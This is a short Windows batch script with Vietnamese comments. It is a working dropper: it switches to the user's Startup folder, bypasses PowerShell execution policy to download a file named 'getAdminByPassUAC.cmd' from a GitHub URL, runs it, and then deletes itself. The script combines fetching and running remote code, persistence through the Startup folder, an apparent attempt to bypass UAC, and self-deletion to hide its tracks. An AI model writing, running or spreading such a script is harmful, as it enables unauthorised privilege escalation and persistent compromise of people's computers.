@echo off
set "HERE=%cd%"

:: Chuyển đến thư mục Startup
cd /d "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

:: Tải tệp PowerShell và thực thi
powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/bruning-frighting/Windows-Internal/main/getAdminByPassUAC.cmd' -OutFile 'getAdminByPassUAC.cmd'"

:: Chạy tệp vừa tải
.\getAdminByPassUAC.cmd

:: Quay lại thư mục cũ
cd /d "%HERE%"

:: Xóa chính script .bat sau khi thực thi
del "%~f0"
